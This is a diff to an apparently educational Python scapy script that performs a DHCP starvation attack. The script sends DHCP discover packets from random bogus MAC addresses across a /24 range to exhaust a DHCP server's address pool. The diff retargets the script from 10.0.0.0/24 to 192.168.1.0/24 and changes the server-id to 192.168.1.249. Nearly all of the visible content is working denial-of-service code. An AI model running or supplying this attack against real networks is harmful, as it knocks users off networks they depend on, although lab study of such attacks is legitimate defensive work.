@@ -6,7 +6,7 @@ import ipaddress
 #  conf.checkIPaddr needs to be set to False. Answer will only be accepted by scapy when it is set to false.
 #  When conf.checkIpaddr is set to False we do not require the IPs to be swapped to count as a response.
 conf.checkIPaddr = False
-possible_ips = [str(ip) for ip in ipaddress.IPv4Network('10.0.0.0/24')]
+possible_ips = [str(ip) for ip in ipaddress.IPv4Network('192.168.1.0/24')]
 # Create a DHCP starvation attack.
 # Create packets with unique bogus MAC Addresses and use them to ask for IP Addresses.
 # This will lead to a Denial of Service Attack (DoS) as the DHCP server will not be able to give out more IP Addresses.
@@ -25,7 +25,7 @@ for ip_add in possible_ips:
     # The opcode of 1 says that it is a boot request. The client hardware address is assigned a random MAC Address. BootP is the predecessor of DHCP.
     bootp = BOOTP(op=1,chaddr = bog_src_mac)
     # We want to send a DHCP discover message. This packet will ask for an IP Address from the DHCP server.
-    dhcp = DHCP(options=[("message-type", "discover"), ("requested_addr", ip_add), ("server-id", "10.0.0.2"), ('end')])
+    dhcp = DHCP(options=[("message-type", "discover"), ("requested_addr", ip_add), ("server-id", "192.168.1.249"), ('end')])
 
     pkt = broadcast / ip / udp / bootp / dhcp
 
